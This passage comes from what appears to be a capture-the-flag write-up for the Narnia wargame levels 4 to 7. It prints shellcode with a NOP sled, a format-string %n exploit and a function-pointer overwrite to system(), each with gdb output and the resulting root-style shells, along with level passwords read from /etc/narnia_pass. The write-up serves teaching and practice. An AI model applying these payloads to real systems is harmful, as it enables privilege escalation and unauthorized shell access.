$(echo -n -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\xa0\xd6\xff\xff")
```

let's run the payload.
```ruby
narnia4@gibson:/narnia$ ./narnia4 $(echo -n -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\xa0\xd6\xff\xff")
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
1oCoEkRJSB
```

Great, it works.

## Level 5

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
  
int main(int argc, char **argv){
int i = 1;
char buffer[64];
  
snprintf(buffer, sizeof buffer, argv[1]);
buffer[sizeof (buffer) - 1] = 0;
printf("Change i's value from 1 -> 500. ");
  
if(i==500){
printf("GOOD\n");
        setreuid(geteuid(),geteuid());
system("/bin/sh");
}
  
printf("No way...let me give you a hint!\n");
printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
printf ("i = %d (%p)\n", i, &i);
return 0;
}
```

The program defines int variable `i`, and string variable `buffer` of length 64 bytes.
Then, the program uses `snprintf()` to print the size of the buffer to the output stream given with `argv[1]`.

The program then checks if `i==500`, and if so we get a shell.


Let's use gdb to see where the variables are stored.

```ruby
(gdb) disas main
Dump of assembler code for function main:
   0x080491d6 <+0>: push   ebp
   0x080491d7 <+1>: mov    ebp,esp
   0x080491d9 <+3>: push   ebx
   0x080491da <+4>: sub    esp,0x44
   0x080491dd <+7>: mov    DWORD PTR [ebp-0x8],0x1
   0x080491e4 <+14>: mov    eax,DWORD PTR [ebp+0xc]
   0x080491e7 <+17>: add    eax,0x4
   0x080491ea <+20>: mov    eax,DWORD PTR [eax]
   0x080491ec <+22>: push   eax
   0x080491ed <+23>: push   0x40
   0x080491ef <+25>: lea    eax,[ebp-0x48]
   0x080491f2 <+28>: push   eax
   <code snipped>
```

Two instruction look interesting to me:

```C
0x080491dd <+7>: mov    DWORD PTR [ebp-0x8],0x1

0x080491ef <+25>: lea    eax,[ebp-0x48]
```
 These two instructions are indicating that the variable `i` is located at `[ebp-0x8]`, and the buffer variable is located at `[ebp-0x48]`.

Next, in instruction `main+57` the program performs the comparison `i==500 `
```ruby
0x0804920c <+54>: mov    eax,DWORD PTR [ebp-0x8]
0x0804920f <+57>: cmp    eax,0x1f4
```

This is the place we will break the code to see what value EAX will hold at the time of the comparison.
```ruby
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9

Breakpoint 1, 0x0804920f in main ()
(gdb) x/90xb $esp
0xffffd460: 0x41 0x61 0x30 0x41 0x61 0x31 0x41 0x61
0xffffd468: 0x32 0x41 0x61 0x33 0x41 0x61 0x34 0x41
0xffffd470: 0x61 0x35 0x41 0x61 0x36 0x41 0x61 0x37
0xffffd478: 0x41 0x61 0x38 0x41 0x61 0x39 0x41 0x62
0xffffd480: 0x30 0x41 0x62 0x31 0x41 0x62 0x32 0x41
0xffffd488: 0x62 0x33 0x41 0x62 0x34 0x41 0x62 0x35
0xffffd490: 0x41 0x62 0x36 0x41 0x62 0x37 0x41 0x62
0xffffd498: 0x38 0x41 0x62 0x39 0x41 0x63 0x30 0x00
0xffffd4a0: 0x01 0x00 0x00 0x00 0x00 0xa0 0xe2 0xf7
0xffffd4a8: 0x20 0xd0 0xff 0xf7 0x19 0x15 0xc2 0xf7
0xffffd4b0: 0x02 0x00 0x00 0x00 0x64 0xd5 0xff 0xff
0xffffd4b8: 0x70 0xd5

x/16xb $ebp-0x8
0xffffd4a0: 0x01 0x00 0x00 0x00 0x00 0xa0 0xe2 0xf7
0xffffd4a8: 0x20 0xd0 0xff 0xf7 0x19 0x15 0xc2 0xf7
```

We see that `[ebp-0x8]` is still set to 1, even when we inputed 90 byte string to the buffer. as we can see, our long string is terminated with a null byte - 0x00 at `0xffffd49f`.
This is happening because the program intentionally puts null at the last byte of the string to prevent overflowing.

Since the program puts a null byte at `sizeof(buffer)-1`, we cannot simply pass a string longer than 64 bytes, because it will be terminated. We need to think of something else.

I'm not familiar with the `snprintf()` function. let's see how it works.

```C

narnia5@gibson:~$ man snprintf

<snipped>

int snprintf(char *str, size_t size, const char *format)

<snipped>

```

In our case, `argv[1]` is the format passed into `snprintf()`. This opens the opportunity for Format String Attack.

### Format String Attack
A format string attack is an attack vector that takes advantage of C language printf() format strings.
printf() format strings are used most commonly to print variable data, like `%d` for printing INT type variable, or `%s` for a string type.
But, `printf()` (or in our case `snprintf()` ) can also set data to a memory address!
This is done with the `%n` format.

>  `%n` reads the value stored in the current buffer pointer and write to that memory location the number of characters already printed

Great, now we need to find a way to make printf() print 500 chars, and using the %n format we will be able to input the number 500 into the `i` variable.

Luckily the program provides us the memory address of `i` which saves us work with gdb.
Great. Let's take advantage of that when creating our formatted string.

```ruby
**narnia5@gibson**:**/narnia**$ ./narnia5 $(echo -n -e "\x10\xd5\xff\xff\x10\xd5\xff\xffAAAA%n")
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [??????AAAA] (12)
i = 12 (0xffffd510)
```

After playing some time around with different strings, we can see that if we enter the address of `i` twice, we are able to changed it's value! in this example it is overwritten with the value 12, this is because the first 8 bytes is the address of `i` twice, followed by 4 more As. Total 12  bytes.

Okay, so we know we can write to the address of `i`, but we need to write 500 bytes into it!
In this case, we can use the format `%492x` - It determines the minimum number of characters to be printed. If the number of characters required to represent the value is less than the specified width, spaces are added as padding characters to meet the width requirement.
In our case spaces will be added to the beginning to pad the address. The string will hold total of 500 bytes. Let's run it! 

```ruby
narnia5@gibson:/narnia$ ./narnia5 $(echo -n -e "\x10\xd5\xff\xff\x10\xd5\xff\xff%492x%n")

change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
BAV0SUV0iM
$
```


## Level 6

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
  
extern char **environ;
  
// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}
  
int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;
	  
	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
	  
	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));
	  
	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	setreuid(geteuid(),geteuid());
	    fp(b1);
	  
	exit(1);
}
```

Okay, from what I understand here, the program clears env, and all `argv` arguments except `argv[0]`, `argv[1]` and `argv[2]`. Then, it copies argv[1] and argv[2] into b1 and b2 without checking for input length. This is good for us because it opens a path for a buffer overflow.

The program also defines a function pointer `fp` that points to `puts`. That's why b1 string is printed out. Our goal here is to overwrite the function pointer to point into another function, and make this function exec a shell. 

let's fire up gdb and have a look.

```ruby
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
<code snipped>
0x080492dd <+234>: call   0x8049070 <strcpy@plt>
0x080492e2 <+239>: add    esp,0x8
0x080492e5 <+242>: mov    eax,DWORD PTR [ebp+0xc]
0x080492e8 <+245>: add    eax,0x8
0x080492eb <+248>: mov    eax,DWORD PTR [eax]
0x080492ed <+250>: push   eax
0x080492ee <+251>: lea    eax,[ebp-0x1c]
0x080492f1 <+254>: push   eax
0x080492f2 <+255>: call   0x8049070 <strcpy@plt>
0x080492f7 <+260>: add    esp,0x8                    ;break #1
0x080492fa <+263>: mov    eax,DWORD PTR [ebp-0xc]
<code snipped>
0x0804932d <+314>: push   eax
0x0804932e <+315>: mov    eax,DWORD PTR [ebp-0xc]
0x08049331 <+318>: call   eax.                       ;break #2
<code snipped>
```

There are 2 places i would like to break. The first, is right after the second strcpy. At this breakpoint we will see the stack layout and where each string will be located at.
The second breakpoint will show us what `EAX` holds before getting called.

```ruby
(gdb) b *main+260
Breakpoint 1 at 0x80492f7
(gdb) b *main+318
Breakpoint 2 at 0x8049331
```

Starting with a simple input, let's enter 8 A's and 8 B's into the program.

```ruby
(gdb) r AAAAAAAA BBBBBBBB
Starting program: /narnia/narnia6 AAAAAAAA BBBBBBBB
Breakpoint 1, 0x080492f7 in main ()
(gdb) x/30xw $esp
0xffffd574: 0xffffd57c 0xffffd7b7 0x42424242 0x42424242
0xffffd584: 0x41414100 0x41414141 0x08049000 0x00000003
0xffffd594: 0xf7e2a000 0xf7ffd020 0xf7c21519 0x00000003
0xffffd5a4: 0xffffd654 0xffffd664 0xffffd5c0 0xf7e2a000
0xffffd5b4: 0x080491f3 0x00000003 0xffffd654 0xf7e2a000
0xffffd5c4: 0xffffd654 0xf7ffcb80 0xf7ffd020 0x9c9ef27b
0xffffd5d4: 0xe71c186b 0x00000000 0x00000000 0x00000000
0xffffd5e4: 0xf7ffcb80 0xf7ffd020
```

As we can see, the stack holds 8 B's (`0x42`) and 8 A's (`0x41`).
Now let's continue and examine the second break point.
```ruby
(gdb) c
Breakpoint 2, 0x08049331 in main ()
(gdb) x/x $eax
0x8049080 <puts@plt>: 0xb1fc25ff
```

As we thought in the beginning, the program calls `$EAX` which is the `puts()` function to print the value of the first parameter.
Continuing the process results in the printing of `AAAAAAAA`.
```ruby
(gdb) c
Continuing.
AAAAAAAA
```

Now, let's explore and find our buffer overflow.

```ruby
(gdb) r $(python3 -c "print('A'*20 + ' ' + 'B'*20)")
Breakpoint 1, 0x080492f7 in main ()
(gdb) x/16xw $esp
0xffffd564: 0xffffd56c 0xffffd7ab 0x42424242 0x42424242
0xffffd574: 0x42424242 0x42424242 0x42424242 0x41414100
0xffffd584: 0x41414141 0xf7ffd000 0xf7c21519 0x00000003
0xffffd594: 0xffffd644 0xffffd654 0xffffd5b0 0xf7e2a000
(gdb) c
Continuing.
Breakpoint 2, 0x08049331 in main ()
(gdb) x/x $eax
0x42424242: Cannot access memory at address 0x42424242
```

We can see that we successfully overwrote $EAX to hold `0x42424242`. 
The program tries to execute `0x42424242` but fails, as expected.
Knowing that we can overflow `EAX` with B's, we need to find which Bs are responsible for overflowing. For this case we could use the tool [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/). 
Generating a 20 char string:
```rust
Aa0Aa1Aa2Aa3Aa4Aa5Aa
```

```rust
Starting program: /narnia/narnia6 AAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa
Breakpoint 1, 0x080492f7 in main ()
(gdb) c
Continuing.
Breakpoint 2, 0x08049331 in main ()
(gdb) x/x $eax
0x61413561: Cannot access memory at address 0x61413561
(gdb)
```

`0x61413561` is in little endian format. If we translate it to a string we would get:
```rust
0x61413561 ---> 0x61 0x35 0x41 0x61 --> a5Aa
```
This string starts at byte 16 of our 20 byte pattern string. This means that the last 4 bytes of the second argument will overwrite `EAX`. 
Now, let's find out the memory location of system() command, to make the program execute `system(sh)`.

```ruby
(gdb) p system
$3 = {int (const char *)} 0xf7c48170 <__libc_system>
```

The `system()` function is located at `0xf7c48170`, so we should overwrite EAX with this address. When the program calls `puts()`, it outputs the first argument to the string, meaning that the first argument is inserted into puts. Now after we overwrite and call `system()` we would like to pass `sh` into it. So the first argument will be `sh;AAAAA` and the second one will be `B*15\x70\x81\xc4\xf7` .

```ruby
narnia6@gibson:/narnia$ ./narnia6 $(echo -n -e "sh;AAAAA\x70\x81\xc4\xf7 B")
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
YY4F9UaB60
```


## Level 7

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
  
int goodfunction();
int hackedfunction();
  
int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();
  
        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);
  
        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
  
        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;
  
        snprintf(buffer, sizeof buffer, format);
  
        return ptrf();
}
  
int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}
  
int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}
  
int hackedfunction(){
        printf("Way to go!!!!");
	    fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
  
        return 0;
}
```

We can see from the source code that we pass the program an argument at start,